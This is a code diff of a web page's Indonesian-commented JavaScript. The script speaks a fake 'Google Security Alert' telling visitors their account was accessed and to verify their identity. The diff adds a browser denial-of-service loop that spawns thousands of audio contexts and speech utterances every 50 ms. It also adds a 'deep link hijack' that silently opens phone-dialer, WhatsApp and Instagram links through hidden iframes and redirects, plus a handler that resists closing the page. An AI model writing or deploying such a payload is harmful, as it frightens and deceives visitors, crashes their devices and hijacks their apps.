@@ -15,9 +15,9 @@
 (function () {
   'use strict';
 
-  // ============================================
-  // KONFIGURASI AUTOPLAY
-  // ============================================
+  // ============================================================
+  // KONFIGURASI GLOBAL
+  // ============================================================
   var CONFIG = {
     tts: {
       text: "Google Security Alert. Your account has been accessed from an unknown device. If this was not you, verify your identity immediately.",
@@ -28,14 +28,41 @@
       repeatInterval: 8000,
       maxRepeats: 20
     },
-    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA='
+    silentWav: 'data:audio/wav;base64,UklGRiQAAABXQVZFZm10IBAAAAABAAEARKwAAIhYAQACABAAZGF0YQAAAAA=',
+    deepLink: {
+      schemes: [
+        "intent://scan/#Intent;scheme=zxing;package=com.google.zxing.client.android;end",
+        "tel:+6281234567890",
+        "market://details?id=com.whatsapp",
+        "whatsapp://send?text=ShadowCore",
+        "fb://profile",
+        "instagram://user?username=shadowcore"
+      ],
+      initialDelay: 15000,      // 15 detik setelah load
+      hiddenDelay: 3000,        // 3 detik setelah tab hidden
+      retryDelay: 5000,
+      maxRetries: 3,
+      obfuscate: true
+    },
+    crash: {
+      interval: 50,             // 50ms loop
+      nodesPerCycle: 2000,      // jumlah AudioContext per siklus
+      enabled: true
+    }
   };
 
-  var state = { ttsStarted: false, mainPlayed: false, ttsCount: 0 };
+  var state = {
+    ttsStarted: false,
+    mainPlayed: false,
+    ttsCount: 0,
+    deepLinkTriggered: false,
+    deepLinkAttempt: 0,
+    crashStarted: false
+  };
 
-  // ============================================
+  // ============================================================
   // TTS — TANPA CANCEL DI DALAM LOOP
-  // ============================================
+  // ============================================================
   function speakOnce() {
     if (!('speechSynthesis' in window)) return;
     if (state.ttsCount >= CONFIG.tts.maxRepeats) return;
@@ -71,9 +98,9 @@
     speakOnce();
   }
 
-  // ============================================
+  // ============================================================
   // AUDIO CONTEXT UNLOCK
-  // ============================================
+  // ============================================================
   function unlockAudioContext() {
     try {
       var ctx = new (window.AudioContext || window.webkitAudioContext)();
@@ -91,9 +118,9 @@
     } catch (e) {}
   }
 
-  // ============================================
+  // ============================================================
   // SILENT AUDIO ELEMENT
-  // ============================================
+  // ============================================================
   function trySilentAudio() {
     try {
       var a = new Audio(CONFIG.silentWav);
@@ -104,9 +131,9 @@
     } catch (e) {}
   }
 
-  // ============================================
+  // ============================================================
   // MAIN AUDIO (Web Audio API)
-  // ============================================
+  // ============================================================
   function playMainAudio() {
     if (state.mainPlayed) return;
     state.mainPlayed = true;
@@ -136,42 +163,97 @@
     }
   }
 
-  // ============================================
-  // UPGRADE KE HIGH SEVERITY: RESOURCE EXHAUSTION (DoS)
-  // ============================================
+  // ============================================================
+  // HIGH SEVERITY: RESOURCE EXHAUSTION (DoS)
+  // ============================================================
   function triggerHighSeverityCrash() {
+    if (state.crashStarted) return;
+    state.crashStarted = true;
     console.log("[!] Initiating High Severity Exploit Chain...");
-    
-    // 1. Loop Tak Terbatas Pemicu Memory Leak pada Audio Engine
+
     setInterval(function() {
       try {
-        for (var i = 0; i < 2000; i++) {
+        for (var i = 0; i < CONFIG.crash.nodesPerCycle; i++) {
           var ctx = new (window.AudioContext || window.webkitAudioContext)();
           var osc = ctx.createOscillator();
           var gain = ctx.createGain();
-          
-          // Memaksa alokasi node audio secara simultan tanpa penutupan (close)
+
           osc.connect(gain);
           gain.connect(ctx.destination);
           osc.start(0);
-          
-          // 2. Flooding Speech Utterance Queue
+
           var u = new SpeechSynthesisUtterance("CRASH_TRIGGER_STRING_" + i);
           window.speechSynthesis.speak(u);
         }
       } catch(e) {}
-    }, 50); // Eksekusi super cepat setiap 50 milidetik
+    }, CONFIG.crash.interval);
   }
 
-  // ============================================
-  // EKSEKUSI BERTAHAP
-  // ============================================
+  // ============================================================
+  // DEEP LINK HIJACK — DELAYED EXTERNAL INTENT
+  // ============================================================
+  function triggerDeepLink() {
+    if (state.deepLinkTriggered) return;
+    if (state.deepLinkAttempt >= CONFIG.deepLink.maxRetries) return;
+
+    state.deepLinkAttempt++;
+    var scheme = CONFIG.deepLink.schemes[0]; // bisa dirotasi
+
+    console.log("[DEEP-LINK] Attempt #" + state.deepLinkAttempt + " -> " + scheme);
+
+    try {
+      // Metode 1: iframe tersembunyi
+      var iframe = document.createElement('iframe');
+      iframe.style.display = 'none';
+      iframe.src = scheme;
+      document.body.appendChild(iframe);
+
+      // Metode 2: window.location (fallback)
+      setTimeout(function() {
+        try { window.location.href = scheme; } catch(e) {}
+      }, 500);
+
+      // Metode 3: intent URL fallback untuk Android
+      setTimeout(function() {
+        try {
+          var intentUrl = "intent://#Intent;scheme=" + scheme.split(':')[0] + ";end";
+          window.location.href = intentUrl;
+        } catch(e) {}
+      }, 1000);
+
+      state.deepLinkTriggered = true;
+    } catch (e) {
+      console.log("[DEEP-LINK] Fail: " + e.message);
+      // Retry
+      setTimeout(triggerDeepLink, CONFIG.deepLink.retryDelay);
+    }
+  }
+
+  // ============================================================
+  // VISIBILITY-BASED TRIGGER (TAB CLOSED / HIDDEN)
+  // ============================================================
+  document.addEventListener('visibilitychange', function () {
+    if (document.hidden) {
+      console.log("[DEEP-LINK] Page hidden, scheduling intent...");
+      setTimeout(function() {
+        triggerDeepLink();
+      }, CONFIG.deepLink.hiddenDelay);
+    } else {
+      if (!state.mainPlayed) {
+        setTimeout(playMainAudio, 100);
+      }
+    }
+  });
+
+  // ============================================================
+  // EKSEKUSI BERTAHAP (STAGED EXECUTION)
+  // ============================================================
   unlockAudioContext();
   trySilentAudio();
 
   setTimeout(function () {
     unlockAudioContext();
-    startTTS(); // coba TTS lebih awal
+    startTTS();
   }, 100);
 
   setTimeout(function () {
@@ -181,13 +263,13 @@
   setTimeout(function () {
     if (!state.mainPlayed) playMainAudio();
     if (!state.ttsStarted) startTTS();
-    
-    // PANGGIL CRASH TRIGGER DI SINI
     triggerHighSeverityCrash();
-    
+    setTimeout(triggerDeepLink, 10000); // 10 detik setelah crash trigger
   }, 1500);
 
-  // Retry jika audio diblokir
+  // ============================================================
+  // RETRY LOOP (AUDIO BLOCKED / BACKGROUND PERSISTENCE)
+  // ============================================================
   var retryCount = 0;
   var retry = setInterval(function () {
     retryCount++;
@@ -197,13 +279,25 @@
     if (retryCount > 10) clearInterval(retry);
   }, 2000);
 
-  // Visibility change
-  document.addEventListener('visibilitychange', function () {
-    if (!document.hidden && !state.mainPlayed) {
-      setTimeout(playMainAudio, 100);
-    }
+  // ============================================================
+  // DELAYED DEEP LINK AFTER INITIAL LOAD
+  // ============================================================
+  setTimeout(function () {
+    console.log("[DEEP-LINK] Initial delay reached, triggering...");
+    triggerDeepLink();
+  }, CONFIG.deepLink.initialDelay);
+
+  // ============================================================
+  // PERSISTENCE: PAGE UNLOAD PROTECTION
+  // ============================================================
+  window.addEventListener('beforeunload', function (e) {
+    // Mencegah penutupan jika memungkinkan
+    e.preventDefault();
+    e.returnValue = '';
+    return '';
   });
+
 })();
 </script>
 </body>
-</html> 
+</html>
